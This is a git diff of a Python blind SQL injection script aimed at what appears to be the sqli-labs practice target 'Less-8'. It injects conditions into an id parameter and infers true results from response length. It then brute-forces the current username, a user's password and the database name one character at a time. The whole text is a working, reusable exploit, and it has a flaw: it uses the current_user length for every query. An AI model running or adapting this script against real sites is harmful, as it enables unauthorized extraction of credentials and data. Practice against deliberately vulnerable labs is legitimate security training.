@@ -1,7 +1,16 @@
 #!/usr/bin/env python
+# python 2.7 or greater
+
 import requests, string
 
-URL = "http://localhost/Less-8/?id=1'"
+host = "http://sqli.localhost"
+inject = "'"
+
+URL = "%s/Less-8/?id=1%s" % (host, inject)
+
+# Validate when vulnerable to sqli with content length
+CONTENT_LENGTH = 705
+
 special_chars = "@"
 COMBINATIONS = string.ascii_letters + special_chars
 
@@ -10,20 +19,21 @@ def make_request(url):
         response = requests.get(url)
         return response
     except:
-        print("check the url", url)
+        print("[-] Seems like url is not right, check it and try again", url)
 
 
-def check_if_vulnerable(url):
+def is_vulnerable(url):
     response = make_request(url)
-    if (response.status_code == 200 and len(response.text) == 706):
-#        print("Vulnerable to SQL injection")
+    if (response.status_code == 200 and len(response.text) == CONTENT_LENGTH):
+    #    print("Vulnerable to SQL injection")
         return True
+    return False
 
 def user_length():
     i = 1
     while True:
         url = "%s and LENGTH(current_user)='%s" % (URL, i)
-        if check_if_vulnerable(url):
+        if is_vulnerable(url):
             return i
         else:
             i += 1
@@ -31,25 +41,28 @@ def user_length():
 def bruteforce_with(query, number, result):
     for i in COMBINATIONS:
         url  = "%s and ascii(SUBSTRING(([query]),1,1))='%s" % (URL, str(ord(i)))
+
         url = url.replace("([query]),1,1)", "(%s), %s, 1)" % (query, str(number)))
-        if check_if_vulnerable(url):
-            print("current letter : %s" % i)
+        if is_vulnerable(url):
             result.append(i)
             break
 
-def read_data(query, result):
+def extract_data(query, result):
     i = 1
     length = user_length()
     print("[+] Checking data for query: %s \n" % query)
+
     while i <= length:
         bruteforce_with(query, i, result)
         i += 1
 
     word = ''.join(result)
-    print("[+] Result is %s \n\n" % word)
+    print("\n[+] Result is %s \n\n" % word)
 
-url = "%s and 1 = '1" % URL
-q  = "select username from users where id = 1"
-read_data(q, [])
-q  = "select database()"
-read_data(q, [])
+if  __name__ == '__main__':
+    q  = "select username from users where id = 1"
+    extract_data(q, [])
+    q  = "select password from users where id = 1"
+    extract_data(q, [])
+    q  = "select database()"
+    extract_data(q, [])
